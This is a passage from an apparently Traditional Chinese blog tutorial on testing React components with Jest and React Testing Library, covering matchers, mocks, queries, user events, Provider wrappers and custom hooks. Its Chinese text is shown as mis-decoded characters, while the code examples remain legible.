ä¸­æ˜¯å¦æœ‰åŒ…å« abc çš„å…§å®¹ã€‚å¾Œé¢çš„ toHaveTextContent å°±æ˜¯ matcherã€‚ é€™è£¡åˆ—å‡ºå¹¾å€‹æ¯”è¼ƒå¸¸ç”¨åˆ°çš„ matcherï¼š toHaveTextContent å…ƒç´ çš„æ–‡å­—å…§å®¹ toBeInTheDocument å…ƒç´ æœ‰å‡ºç¾åœ¨ DOM not.toBeInTheDocument æ–‡å­—æ²’æœ‰å‡ºç¾åœ¨ DOM é€™é‚Šè¬›çš„ matcher å¤šæ•¸æ˜¯ä¾†è‡ª jest-domï¼Œå¦‚æœä½ æƒ³æŸ¥ jest è‡ªå·±çš„ matcher å¯ä»¥åƒè€ƒ Jest çš„å®˜æ–¹æ–‡ä»¶ã€‚ Jest API describe() æŠŠä¸€ç¾¤ test çµ¦ group èµ·ä¾† test.only() å¿½ç•¥æ‰ç›®å‰æª”æ¡ˆä¸­çš„å…¶ä»–æ¸¬è©¦ï¼ŒåªåŸ·è¡Œ only é€™å€‹ caseã€‚ test.skip() å¿½ç•¥æ‰é€™å€‹ caseã€‚ Jest Mockä¸€å€‹ mock function å¯èƒ½æœ‰å¾ˆå¤šç¨®å¯«æ³•ï¼Œæ‰€ä»¥é€™é‚Šç°¡å–®ä»‹ç´¹å¹¾å€‹æ¯”è¼ƒå®¹æ˜“ææ··çš„ç¨®é¡ã€‚ 1. jest.fn() èˆ‡ jest.fn().mockImplementation é€™å…©å€‹å…¶å¯¦æ˜¯ç­‰åƒ¹çš„æ±è¥¿ï¼Œåªæ˜¯å¦‚æœä½ æ˜¯å¯« TypeScript çš„è©±æˆ‘è¦ºå¾—å‰è€…æœƒæ¯”è¼ƒæ–¹ä¾¿ä¸€é»ï¼š 12345678910111213describe('Mock compare', () =&gt; { test('mock function 1', () =&gt; { const mockFn = jest.fn((value: string) =&gt; value) console.log(mockFn('Hello')) // Hello }) test('mock function 2', () =&gt; { // éœ€è¦ç”¨ \"as\" ä¾†æŒ‡å®š mockFn çš„ type const mockFn = jest.fn().mockImplementation((value: string) =&gt; value) as jest.MockedFunction&lt; (value: string) =&gt; void &gt; console.log(mockFn('Ha Ha Ha')) // Ha Ha Ha })}) 2. jest.fn(() =&gt; ...) èˆ‡ jest.fn().mockReturn...() é€™å…©å€‹ä¹Ÿæ˜¯å·®ä¸å¤šçš„æ±è¥¿ï¼Œä½†åœ¨ä¸é—œå¿ƒåƒæ•¸çš„æƒ…æ³ä¸‹æˆ‘æœƒå»ºè­°ç”¨ mockReturn... ä¾†è™•ç†ï¼š 123456789101112describe('Mock compare', () =&gt; { test('mock function 1', () =&gt; { const mockFn = jest.fn(() =&gt; true) console.log(mockFn()) // true expect(mockFn).toBeCalledTimes(1) }) test('mock function 2', () =&gt; { const mockFn = jest.fn().mockReturnValue(false) console.log(mockFn()) // false expect(mockFn).toBeCalledTimes(1) })}) è€Œç•¶ä½ é—œå¿ƒåƒæ•¸æ™‚å‰‡æœƒç”¨ jest.fn(() =&gt; ...) æ­é… toBeCalledWith ä¾†æ¸¬è©¦å‚³å…¥çš„åƒæ•¸æ˜¯å¦æ­£ç¢ºï¼š 12345test('mock function call with right args', () =&gt; { const mockFn = jest.fn((value: boolean) =&gt; value) mockFn(true) expect(mockFn).toBeCalledWith(true)}) æ‰€ä»¥æˆ‘è¦ºå¾—é€™å…©å€‹çš„å·®åˆ¥åœ¨æ–¼ç”¨é€”ï¼Œç•¶ä½ åªåœ¨æ„å›å‚³å€¼çš„æ™‚å€™æœƒç”¨ mockReturn...ï¼Œåœ¨æ„åƒæ•¸çš„æ™‚å€™æœƒç”¨ jest.fn(() =&gt; ...)ã€‚ åªæƒ³ mock ä¸€éƒ¨åˆ†çš„å…§å®¹å‡è¨­æˆ‘å€‘ç¾åœ¨æœ‰ä¸€å€‹ module çš„å…§å®¹é•·é€™æ¨£ï¼š 12345678910export function getName(): string { return 'PeaNu'}export function getAge(): number { return 20}export const person = { name: 'PeaNu', age: 20} ç„¶å¾Œ component çš„å…§å®¹å¦‚ä¸‹ï¼š 1234567891011121314import { getAge, getName, person } from './utils'export const Module = () =&gt; { // ä½¿ç”¨ module console.log('person', person) console.log('getName', getName()) console.log('getAge', getAge()) return ( &lt;div&gt; &lt;h2&gt;Module Test&lt;/h2&gt; &lt;/div&gt; )} æ¥è‘—ï¼Œå¦‚æœæˆ‘æƒ³è¦ mock çš„åªæœ‰ getNameï¼Œé‚£å¯ä»¥é€™æ¨£å¯«ï¼š 1234567891011121314151617import { render } from '@testing-library/react'import { Module } from './Module'jest.mock('./utils', () =&gt; { return { // æŠŠåŸæœ¬çš„ module å±•é–‹ ...jest.requireActual('./utils'), // å¯«ä¸Šè¦ä¿®æ”¹çš„å±¬æ€§ï¼ˆè¦†å¯«ï¼‰ getName: jest.fn(() =&gt; 'ABC') }})describe('Module', () =&gt; { test('render correctly', () =&gt; { render(&lt;Module /&gt;) })}) é™„è¨»ï¼šå°±è·Ÿä½ åœ¨ä¿®æ”¹ Object çš„ç‰¹å®š property çš„æ¦‚å¿µå¾ˆåƒã€‚ å‡ºä¾†çš„çµæœå¦‚ä¸‹ï¼š çœ¼å°–çš„è©±æœƒæ³¨æ„åˆ° module ä¸­æœ‰ä¸€å€‹ personï¼Œé€™æ˜¯è¦åšä»€éº¼ç”¨çš„ï¼Ÿ é€™æ˜¯æƒ³ç¤ºç¯„å¦‚æœä½ åªæƒ³ä¿®æ”¹ person ä¸­çš„æŒ‡å®šå±¬æ€§çš„è©±ï¼Œç”šè‡³å¯ä»¥é€™æ¨£åšï¼š 12345678910111213141516171819202122import { render } from '@testing-library/react'import { Module } from './Module'jest.mock('./utils', () =&gt; { return { ...jest.requireActual('./utils'), // ä¿®æ”¹ person person: { // æŠŠåŸæœ¬ person çš„å…§å®¹å±•é–‹ï¼ˆæ³¨æ„å¾Œé¢çš„ .personï¼‰ ...jest.requireActual('./utils').person, // å°è¦ä¿®æ”¹çš„å±¬æ€§åšä¿®æ”¹ name: 'PPB' }, getName: jest.fn(() =&gt; 'ABC') }})describe('Module', () =&gt; { test('render correctly', () =&gt; { render(&lt;Module /&gt;) })}) å‡ºä¾†çš„çµæœå¦‚ä¸‹ï¼š ç¸½ä¹‹ï¼Œé€™ä¸€æ®µåªæ˜¯æƒ³ä»‹ç´¹ jest.mock çš„ factory åŠŸèƒ½ï¼Œè©³ç´°å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶çš„é€™æ®µ RTLï¼Queryä¸€èˆ¬åœ¨å° React Component å¯«æ¸¬è©¦çš„æ™‚å€™ï¼Œæˆ‘å€‘æœƒæœ‰ä¸€å€‹ã€ŒQueryï¼ˆæŸ¥è©¢ï¼‰ã€å‹•ä½œï¼Œåƒé€™æ¨£ï¼š 123456test('renders correctly !!', () =&gt; { render(&lt;Greet /&gt;) // æ‰¾å‡ºåŒ…å« hello æ–‡å­—çš„ DOM å…ƒç´  const element = screen.getByText(/hello/i) expect(element).toBeInTheDocument()}) ä»¥ RTL çš„ convention ä¾†èªªï¼Œè¦æŸ¥è©¢å–®ä¸€å…ƒç´ çš„ query æœ‰é€™äº›ï¼š getByâ€¦ queryByâ€¦ findByâ€¦ å¤šå€‹å…ƒç´ çš„è©±ï¼š getAllByâ€¦ queryAllByâ€¦ findAllByâ€¦ è¦æ³¨æ„çš„å¹¾ä»¶äº‹ï¼š findBy ä¸€å®šè¦æ­é… async await ä½¿ç”¨ æŸ¥è©¢å–®ä¸€å…ƒç´ çš„ query å¦‚æœæ‰¾åˆ°å¤šç­†çš„è©±æœƒå ±éŒ¯ ç›¡é‡å¾ user çš„è§’åº¦å»é¸æ“‡é©åˆçš„ queryï¼Œè—‰æ­¤å¾—çŸ¥ a11y çš„å“è³ªï¼Œè©³ç´°å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶çš„ priority æ®µè½ query çš„ç”¨é€”query æ˜¯ç”¨ä¾†æŸ¥è©¢ä¸æœƒæ¸²æŸ“åœ¨ç•«é¢ä¸Šçš„å…ƒç´ ï¼Œä¾‹å¦‚ï¼š 12345678910111213export const Skills: React.FC = () =&gt; { const [isLoggedIn, setIsLoggedIn] = useState&lt;boolean&gt;(false) return ( &lt;div&gt; {isLoggedIn ? ( &lt;button&gt;Start Learn&lt;/button&gt; ) : ( &lt;button onClick={() =&gt; setIsLoggedIn(true)}&gt;Login&lt;/button&gt; )} &lt;/div&gt; )} é€™æ™‚å€™å¦‚æœæƒ³æ¸¬è©¦ç¬¬ä¸€æ¬¡æ¸²æŸ“æ™‚ Start Learn ä¸æœƒå‡ºç¾åœ¨ç•«é¢ä¸Šçš„è©±ï¼Œå¯èƒ½æœƒé€™æ¨£å¯«ï¼š 123456test('start learn button is not rendered', () =&gt; { render(&lt;Skills skills={skills} /&gt;) // é€é getByRole æŸ¥è©¢ const buttonElement = screen.getByRole('button', { name: /start learn/i }) expect(buttonElement).not.toBeInTheDocument()}) é€™æ¨£å­åœ¨è·‘æ¸¬è©¦çš„æ™‚å€™å°±æœƒå‡ºéŒ¯ï¼Œå› ç‚º getByRole æ‰¾ä¸åˆ°é‚£å€‹æŒ‰éˆ•ã€‚ æ‰€ä»¥é€™æ™‚å€™å¯ä»¥æ”¹ç”¨ query çš„æ–¹å¼ä¾†æŸ¥è©¢å°±ä¸æœƒå‡ºéŒ¯äº†ï¼š 123456test('start learn button is not rendered', () =&gt; { render(&lt;Skills skills={skills} /&gt;) // æ”¹æˆ query const buttonElement = screen.queryByRole('button', { name: /start learn/i }) expect(buttonElement).not.toBeInTheDocument()}) ä¹‹æ‰€ä»¥å¯ä»¥é€™æ¨£åšæ˜¯å› ç‚ºç•¶ query æ‰¾ä¸åˆ°æŒ‡å®šå…ƒç´ æ™‚æœƒå›å‚³çš„æ˜¯ nullï¼ˆå¦‚æœæ˜¯ queryAll çš„è©±æœƒå›å‚³ []ï¼‰ ï¼Œè€Œä¸æ˜¯ç›´æ¥æ‹‹å‡ºä¸€å€‹ Errorã€‚æˆ‘å€‘æ˜¯åˆ©ç”¨é€™ä¸€é»ä¾†é€šéæ¸¬è©¦çš„ã€‚ find çš„ç”¨é€”find æ˜¯ç”¨ä¾†æŸ¥è©¢æœƒæ ¹æ“š state å‡ºç¾æˆ–æ¶ˆå¤±çš„å…ƒç´ ï¼Œä¾‹å¦‚ï¼š 1234567891011121314151617181920212223242526export const Skills: React.FC&lt;Props&gt; = (props) =&gt; { const [isLoggedIn, setIsLoggedIn] = useState&lt;boolean&gt;(false) // 500ms å¾Œæ›´æ–°ç‚ºç™»å…¥ useEffect(() =&gt; { const timer = setTimeout(() =&gt; { setIsLoggedIn(true) }, 500) return () =&gt; clearTimeout(timer) }, []) return ( &lt;div&gt; &lt;ul&gt; {props.skills.map((skill) =&gt; ( &lt;li key={skill}&gt;{skill}&lt;/li&gt; ))} &lt;/ul&gt; {isLoggedIn ? ( &lt;button&gt;Start Learn&lt;/button&gt; ) : ( &lt;button onClick={() =&gt; setIsLoggedIn(true)}&gt;Login&lt;/button&gt; )} &lt;/div&gt; )} é€™æ™‚å€™æœƒç¢°åˆ°ã€ŒéåŒæ­¥æ›´æ–°ã€çš„å•é¡Œï¼Œå› æ­¤ç”¨ getBy æˆ– query çš„è©±æ²’è¾¦æ³•åšæ­£ç¢ºçš„æŸ¥è©¢ã€‚ æ‰€ä»¥è¦æ”¹ç”¨ find ä¾†è™•ç†ï¼š 123456789test('start learn button is rendered after a little times', async () =&gt; { render(&lt;Skills skills={skills} /&gt;) const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) find æœƒå›å‚³ä¸€å€‹ Promiseï¼Œç•¶ 1000ms å…§æ‰¾åˆ°å…ƒç´ æ™‚ï¼Œå°±æœƒ resolve é€™å€‹ Promiseï¼Œåä¹‹å‰‡ rejectã€‚ ä¸Šé¢åˆ»æ„åŠ ä¸Šäº† { timeout: 2000 } é€™å€‹ optionï¼Œåªæ˜¯è¦æé†’ä½ å¦‚æœé è¨­çš„ 1000ms ä¸å¤ ç”¨çš„è©±å¯ä»¥é€é option ä¾†æ”¹å¯«ã€‚ RTLï¼Debuggingscreen.debugæœ‰æ™‚å€™ä½ å¯èƒ½æœƒæƒ³ç›´æ¥æŸ¥çœ‹ DOM å…ƒç´ çš„çµæ§‹ï¼Œé€™æ™‚å€™å¯ä»¥åœ¨æ¸¬è©¦ä¸­åŠ ä¸Š screen.debugï¼ŒRTL æœƒè‡ªå‹•æŠŠ format å¾Œçš„ DOM Tree å°å‡ºä¾†ï¼š 1234567891011test('start learn button is rendered after a little times', async () =&gt; { render(&lt;Skills skills={skills} /&gt;) // è¨˜å¾—æ”¾åœ¨ render å¾Œçš„ä½ç½® screen.debug() const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) logRoleså¦‚æœä½ æƒ³è¦æŸ¥çœ‹ç›®å‰ DOM ä¸Šçš„æ‰€æœ‰ roleï¼Œå¯ä»¥é€é logRoles ä¾†æŸ¥è©¢ï¼š 123456789101112131415// 1. å¾ RTL ä¸­å¼•å…¥import { render, screen, logRoles } from '@testing-library/react'test('start learn button is rendered after a little times', async () =&gt; { // 2. æŠŠ render çš„çµæœå­˜åˆ°è®Šæ•¸ const view = render(&lt;Skills skills={skills} /&gt;) // 3. æŠŠ container ä¸Ÿçµ¦ logRoles è™•ç† logRoles(view.container) const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) ä¹‹å¾Œå°±èƒ½ç”¨æ¯”è¼ƒå¥½è®€çš„æ ¼å¼ä¾†æŸ¥çœ‹æ‰€æœ‰ rolesï¼š ä¸éå…¶å¯¦ä¹Ÿå¯ä»¥ç”¨ä¸€å€‹æ¯”è¼ƒ tricky çš„æ–¹æ³•ä¾†åšï¼Œå°±æ˜¯ç”¨ screen.getByRole('')ï¼š 1234567891011test('start learn button is rendered after a little times', async () =&gt; { render(&lt;Skills skills={skills} /&gt;) // å° getByRole å‚³å…¥ç©ºå­—ä¸² screen.getByRole('') const buttonElement = await screen.findByRole( 'button', { name: /start learn/i }, { timeout: 2000 } ) expect(buttonElement).toBeInTheDocument()}) é€™æ‹›æ˜¯æ•…æ„è®“ jest æ‹‹å‡ºéŒ¯èª¤ï¼Œèˆ‡æ­¤åŒæ™‚è‡ªå‹•åˆ—å‡ºæˆ‘å€‘å¯ä»¥æœå°‹çš„ roles ä¾†é”åˆ°åŒæ¨£çš„æ•ˆæœï¼š testing-playgroundä¸€å€‹è®“ä½ ç”¨ UI ä¾†ç”¢ç”Ÿå°æ‡‰çš„ RTL Query çš„æ“´å……å¥—ä»¶ï¼Œç”¨èµ·ä¾†æœƒåƒé€™æ¨£ï¼š åªè¦é¸å–æƒ³è¦çš„é‚£å€‹å…ƒç´ å®ƒå°±æœƒè‡ªå‹•ç”¢ç”Ÿé©åˆçš„ query çµ¦ä½ ï¼Œé‚„è »æ–¹ä¾¿çš„ã€‚ RTLï¼Eventç•¶ä½ æƒ³è¦é‡å°ã€Œäº‹ä»¶ã€ä¾†åšæ¸¬è©¦æ™‚æœƒç”¨åˆ° @testing-library/user-event ä¾†è™•ç†ã€‚ æ¯”è¼ƒéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ v13 è·Ÿ v14 çš„å¯«æ³•ä¸å¤ªä¸€æ¨£ï¼Œæ‰€ä»¥é€™é‚Šç¤ºç¯„ä¸€ä¸‹ã€‚ åœ¨ v13 çš„å¯«æ³•æ˜¯é€™æ¨£ï¼š 1234567test('the count should become 1 after user click the button', () =&gt; { render(&lt;Counter /&gt;) const titleElement = screen.getByRole('heading') const btnElement = screen.getByRole('button') userEvent.click(btnElement) expect(titleElement).toHaveTextContent('1')}) é™„è¨»ï¼šä½¿ç”¨è€…æŒ‰ä¸‹æŒ‰éˆ•å¾Œæ•¸å­—æ‡‰è©²å¾ 0 è®Šæˆ 1 åœ¨ v14 çš„å¯«æ³•æ˜¯é€™æ¨£ï¼š 12345678test('the count should become 1 after user click the button', async () =&gt; { userEvent.setup() render(&lt;Counter /&gt;) const titleElement = screen.getByRole('heading') const btnElement = screen.getByRole('button') await userEvent.click(btnElement) expect(titleElement).toHaveTextContent('1')}) åœ¨ v14 ä¸­è¦ç”¨ userEvent å¿…é ˆå…ˆåŸ·è¡Œ setupï¼Œä¸¦ä¸” userEvent è®Šæˆæ˜¯äº†éåŒæ­¥çš„ Promise ï¼Œæ‰€ä»¥è¦æ­é… async await ä¾†ä½¿ç”¨ã€‚ RTLï¼å° Provider ä¸­çš„å…ƒä»¶æ¸¬è©¦ä¸€èˆ¬ä¾†èªªæˆ‘å€‘åœ¨å¯« React çš„æ™‚å€™éƒ½æœƒç”¨ Provider ä¾†åŒ…ä½æ•´å€‹å…ƒä»¶ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415import { Mui } from 'components/Mui/Mui'import { AppProvider } from 'provider/AppProvider'import './App.css'function App() { return ( &lt;AppProvider&gt; &lt;div className='App'&gt; &lt;Mui /&gt; &lt;/div&gt; &lt;/AppProvider&gt; )}export default App é€™è£¡çš„ç¤ºç¯„æ˜¯ç”¨ Mui æä¾›çš„ theme åŠŸèƒ½ä¾†è®“é è¨­çš„æ¨¡å¼æ˜¯ã€Œdark modeã€ï¼Œæ‰€ä»¥æœƒç”¨ä¸€å€‹ Provider ä¾†åŒ…ä½åº•ä¸‹çš„æ‰€æœ‰å…ƒç´ ã€‚ ä¸ç”¨å¤ªåœ¨æ„ AppProvider çš„å…§å®¹æ˜¯ä»€éº¼ï¼Œåªè¦çŸ¥é“æˆ‘å€‘éœ€è¦é€™å€‹ Provier ä¾†è®“ dark mode èƒ½å¤ æ­£å¸¸é‹ä½œå°±å¥½äº†ã€‚ ç„¶è€Œç•¶æˆ‘å€‘æ¸¬è©¦æƒ³æ¸¬è©¦ &lt;Mui&gt; æ™‚ï¼Œå¯èƒ½æœƒå¯«å‡ºé€™æ¨£çš„è¥¿ï¼š 123456789// Mui.tsximport { Typography } from '@mui/material'import { useTheme } from '@mui/material/styles'export const Mui = () =&gt; { const theme = useTheme() return &lt;Typography component='h1'&gt;{theme.palette.mode} mode&lt;/Typography&gt;} 1234567// Mui.test.tsxtest('renders correctly', () =&gt; { render(&lt;Mui /&gt;) const headingElement = screen.getByRole('heading') // å…§å®¹æ‡‰è©²è¦æœ‰ dark æ–‡å­—ï¼ˆå¦‚æœæ˜¯ dark mode çš„è©±ï¼‰ expect(headingElement).toHaveTextContent(/dark/i)}) æ³¨æ„ render çš„å…§å®¹åªæœ‰ &lt;Mui&gt;ï¼Œä¸¦æ²’æœ‰ Provierï¼Œæ‰€ä»¥é€™æ®µæ¸¬è©¦æ˜¯ä¸æœƒé€šéçš„ã€‚ ä½ å¯èƒ½æœƒæƒ³èªªã€Œé‚£æˆ‘ç›´æ¥åœ¨ &lt;Mui&gt; å¤–é¢åŒ…ä¸€å±¤ &lt;AppProvider&gt; ä¸å°±å¥½äº†ï¼Ÿã€ã€‚é€™æ¨£å­ç¢ºå¯¦å¯è¡Œï¼Œä½†é€™æ¨£å°±æ²’æœ‰é‚£éº¼ unit äº†ï¼Œæ‰€ä»¥ä¸€èˆ¬æœƒæ¨è–¦é€™æ¨£åšï¼š 12345678test('renders correctly', () =&gt; { render(&lt;Mui /&gt;, { // å‚³å…¥ option è¨­å®š wrapper wrapper: AppProvider }) const headingElement = screen.getByRole('heading') expect(headingElement).toHaveTextContent(/dark/i)}) é€™æ¨£ jest å°±æœƒè‡ªå‹•åœ¨èƒŒå¾Œè£œä¸€å±¤ Providerï¼Œå°±èƒ½æ­£ç¢ºçš„æ¸¬è©¦äº†ã€‚ å®¢åˆ¶åŒ– render functionä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œå¦‚æœæˆ‘æƒ³æ¸¬è©¦çš„æ±è¥¿éƒ½éœ€è¦ç”¨åˆ° Provider çš„è©±ï¼Œæˆ‘å°±å¾—åœ¨æ¯ä¸€å€‹ render ä¸­éƒ½åŠ å…¥ wrapper é€™å€‹ optionï¼Œå…¶å¯¦æœ‰é»éº»ç…©å°å§ï¼Ÿ è¦è§£æ±ºé€™å€‹å•é¡Œï¼Œå¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ã€‚è£¡é¢æœ‰æ•™ä½ å¦‚ä½•é‡å° render åšå®¢è£½åŒ–ï¼Œé€™æ¨£ä¹‹å¾Œåœ¨ç”¨çš„æ™‚å€™å°±æœƒæ–¹ä¾¿è¨±å¤šã€‚ ç¾åœ¨æ‹¿å‰›å‰›çš„ä¾‹å­ä¾†æ”¹å¯«ä¸€ä¸‹ã€‚é¦–å…ˆï¼Œæˆ‘å€‘å»ºç«‹ä¸€å€‹æ–°çš„æª”æ¡ˆï¼Œä¸¦å¯«å…¥åº•ä¸‹çš„å…§å®¹ï¼š 1234567891011121314// test.utils.tsximport { ReactElement } from 'react'import { render, RenderOptions } from '@testing-library/react'import { AppProvider } from 'provider/AppProvider'// å®¢åˆ¶åŒ–çš„ renderfunction customRender(ui: ReactElement, options?: Omit&lt;RenderOptions, 'wrapper'&gt;) { render(ui, { wrapper: AppProvider, ...options })}// è¼¸å‡ºåŸæœ¬çš„ rtlï¼ˆæ‰€æœ‰å…§å®¹ï¼‰export * from '@testing-library/react'// ç”¨ customRender è¦†å¯«åŸæœ¬çš„ renderexport { customRender as render } é™„è¨»ï¼šå…¶å¯¦å°±æ˜¯æŠŠåŸæœ¬çš„ render ç”¨ customRender åŒ…è£å¾Œå†è¼¸å‡ºï¼Œæ­é…è¨»è§£æƒ³ä¸€ä¸‹æ‡‰è©²ä¸é›£ç†è§£ã€‚ ç„¶å¾Œå†æŠŠå‰›å‰›çš„æ¸¬è©¦çš„å…§å®¹æ”¹å¯«æˆé€™æ¨£ï¼š 123456789// æ”¹ç”¨æˆ‘å€‘å®¢è£½åŒ–ä»¥å¾Œçš„ moduleimport { render, screen } from 'test.utils'import { Mui } from './Mui'test('renders correctly', () =&gt; { render(&lt;Mui /&gt;) const headingElement = screen.getByRole('heading') expect(headingElement).toHaveTextContent(/dark/i)}) é€™æ¨£å­å°±ä¸ç”¨åœ¨æ¯ä¸€å€‹åœ°æ–¹éƒ½åŠ ä¸Š wrapper ä¾†è™•ç†äº†ï¼ŒçœŸçš„æ–¹ä¾¿è¨±å¤šï¼ RTLï¼å° custom hook åšæ¸¬è©¦å‡è¨­æˆ‘æœ‰ä¸€å€‹ custom hook å¦‚ä¸‹ï¼š 1234567891011121314151617181920import { useState } from 'react'interface Props { initialCount?: number}// å› ç‚º initialCount æ˜¯ optionalï¼Œä»£è¡¨ Props æœ‰æ©Ÿæœƒæ˜¯ undefined// ç‚ºäº†é¿å…é€™æ¨£çš„æƒ…å½¢ç™¼ç”Ÿæ‰€ä»¥å¾Œé¢æ‰æœƒå¯«æˆ \"Props = {}\"export function useCounter({ initialCount = 0 }: Props = {}) { const [count, setCount] = useState&lt;number&gt;(initialCount) function increment() { setCount(count + 1) } function decrement() { setCount(count - 1) } return { count, increment, decrement }} é™„è¨»ï¼šé—œæ–¼ Props = {} çš„ç´°ç¯€å¯ä»¥åƒè€ƒé€™è£¡ å°±æ˜¯ä¸€å€‹å¾ˆåŸºæœ¬çš„ counter è€Œå·²ï¼Œä½†ç¾åœ¨è¦å°é€™å€‹ custom hook æ¸¬è©¦çš„è©±æœƒå…ˆç¢°åˆ°å¹¾å€‹å•é¡Œï¼š æ²’è¾¦æ³•ç”¨ render ä¾†æ¸²æŸ“ï¼Œå› ç‚º custom hook ä¸¦ä¸åŒ…å« jsx æ²’è¾¦æ³•ç›´æ¥åœ¨æ¸¬è©¦ä¸­å‘¼å« custom hookï¼Œå› ç‚º hook åªèƒ½åœ¨ component ä¸­è¢«å‘¼å« é—œæ–¼é€™ä¸€é» RTL å·²ç¶“å…ˆå¹«ä½ æƒ³å¥½äº†ï¼Œæ‰€ä»¥å®ƒæä¾›äº† renderHook ä¾†è®“ä½ ä½¿ç”¨ï¼š 123456789// å¼•å…¥ renderHookimport { renderHook } from '@testing-library/react'test('if not recieve props, initial count should be 0', () =&gt; { // å›å‚³å€¼æ˜¯ä¸€å€‹ objectï¼Œå…¶ä¸­ result æ˜¯ useCounter çš„å…§å®¹ const { result } = renderHook(useCounter) // é€é current å°±å¯ä»¥å­˜å–åˆ° useCounter çš„å›å‚³å€¼ expect(result.current.count).toBe(0)}) å¦‚æœè¦å° custom hook å‚³å…¥åƒæ•¸çš„è©±ï¼Œå¯ä»¥é€™æ¨£å­å¯«ï¼š 123456789101112import { renderHook } from '@testing-library/react'test('if recieve props, initial count should be that value', () =&gt; { const count = 10 // é€é option ä¾†è¨­å®š useCounter çš„åƒæ•¸ const { result } = renderHook(useCounter, { initialProps: { initialCount: count } }) expect(result.current.count).toBe(count)}) æ‰€ä»¥é€é renderHook å°±å¯ä»¥å° custom hook ä¾†åšæ¸¬è©¦ã€‚ ç•¶æ¸¬è©¦æœƒæ”¹è®Š state æ™‚ï¼Œéœ€æ­é… act ä½¿ç”¨ç•¶æˆ‘å€‘æƒ³è¦æ¸¬è©¦ custom hook ä¸­çš„ function æ™‚ï¼Œå¯èƒ½æœƒå¾ˆç›´è¦ºçš„é€™æ¨£å¯«ï¼š 12345678import { renderHook } from '@testing-library/react'test('if increment is invoked, count should increase by 1', () =&gt; { const { result } = renderHook(useCounter) // åŸ·è¡Œ increment result.current.increment() expect(result.current.count).toBe(1)}) æ¥è‘—å°±æœƒçœ‹åˆ°é€™æ®µéŒ¯èª¤è¨Šæ¯ï¼š ç°¡å–®ä¾†èªªï¼Œç•¶æˆ‘å€‘åŸ·è¡Œ expect(...) ç•¶ä¸‹çš„é‚£å€‹ state é‚„ä¸æ˜¯æ›´æ–°ä»¥å¾Œçš„å€¼ï¼Œå¦‚æœè¦è®“ç¢ºä¿ expect(...) ç•¶ä¸‹çš„ state æ˜¯æœ€æ–°çš„ï¼Œè¦ç”¨ act ä¾†åŒ…ä½æ›´æ–° state çš„ functionï¼š 123456789// å¼•å…¥ actimport { act, renderHook } from '@testing-library/react'test('if increment is invoked, count should increase by 1', () =&gt; { const { result } = renderHook(useCounter) // ç”¨ act ä¾†åŒ…ä½ increment act(() =&gt; result.current.increment()) expect(result.current.count).toBe(1)}) æ”¹å¯«æˆé€™æ¨£ä»¥å¾Œå°±èƒ½ç¢ºä¿ expect(...) æ‹¿åˆ°çš„ state æœƒæ˜¯æœ€æ–°çš„é‚£ä¸€å€‹ã€‚ RTLï¼åˆ©ç”¨ mock function ä¾†æ¸¬è©¦ä»¥å‰åœ¨ ä¸€å€‹åš Unit test å¯èƒ½æœƒç”¨åˆ°çš„æ–¹æ³• æœ‰å¤§æ¦‚ä»‹ç´¹é mock function çš„å®šç¾©å’Œç”¨é€”ï¼Œåœ¨ React ä¹Ÿæœ‰æ©Ÿæœƒç”¨åˆ°é€™å€‹åŠŸèƒ½ã€‚ åº•ä¸‹æ˜¯è¦ç¤ºç¯„çš„ä¾‹å­ï¼š 123456789101112131415interface Props { count: number onIncrement?: () =&gt; void onDecrement?: () =&gt; void}export const Counter2: React.FC&lt;Props&gt; = (props) =&gt; { return ( &lt;div&gt; &lt;h1&gt;Count: {props.count}&lt;/h1&gt; {props.onIncrement &amp;&amp; &lt;button onClick={props.onIncrement}&gt;Increment&lt;/button&gt;} {props.onDecrement &amp;&amp; &lt;button onClick={props.onDecrement}&gt;Decrement&lt;/button&gt;} &lt;/div&gt; )} æ¥ä¸‹ä¾†ï¼Œç•¶æˆ‘å€‘æƒ³æ¸¬è©¦ onIncrement å’Œ onDecrement çš„æ™‚å€™ï¼Œæœƒç¢°åˆ°ä¸€å€‹å•é¡Œæ˜¯ï¼šè©²å¦‚ä½•æ¸¬è©¦é€™å…©å€‹ functionï¼Ÿ é›–ç„¶é€™å•é¡Œè½èµ·æœ‰é»å¥‡æ€ªï¼Œä½†ä½ å¯ä»¥æƒ³ä¸€ä»¶äº‹æƒ…ã€‚å¾ Counter2 çš„è§’åº¦ä¾†æ€è€ƒçš„è©±ï¼Œå®ƒçš„é—œæ³¨é»ä¸¦ä¸æœƒæ˜¯é€™å…©å€‹ function çš„å…§éƒ¨çš„ç´°ç¯€ï¼Œç•¢ç«Ÿæˆ‘å¯ä»¥åœ¨ onIncrement ä¸­æŠŠ count åŠ ä¸Š 1ï¼Œä¹Ÿå¯ä»¥åŠ ä¸Š 100ï¼Œæˆ–å…¶ä»–å„ç¨®å¯èƒ½ï¼›onDecrement ä¹Ÿæ˜¯åŒç†ã€‚ æ‰€ä»¥ï¼ŒCounter2 è©²é—œæ³¨çš„åœ°æ–¹å…¶å¯¦æ˜¯ï¼š é€™å…©å€‹ function æœ‰æ²’æœ‰åœ¨åœ¨ onClick çš„æ™‚å€™é †åˆ©çš„è¢«åŸ·è¡Œã€‚ å„˜ç®¡é€™å…©å€‹ function æœ‰å¯èƒ½å› ç‚ºæœ¬èº«é‚è¼¯æ²’å¯«å¥½çš„é—œä¿‚å°è‡´ç¨‹å¼å‡ºéŒ¯ï¼Œä½†é‚£éƒ½è·Ÿ Counter2 æ²’æœ‰ç›´æ¥çš„é—œä¿‚ã€‚ åœ¨çŸ¥é“é—œæ³¨é»ä»¥å¾Œï¼Œä½ å¯èƒ½æœƒé€™æ¨£å¯«æ¸¬è©¦ï¼š 1234567891011121314151617181920test('handlers are invoked correctly', async () =&gt; { // å»ºç«‹å…©å€‹æ²’æ„ç¾©çš„ function function incrementHandler() {} function decrementHandler() {} // æ¸²æŸ“å…ƒä»¶ render(&lt;Counter2 count={10} 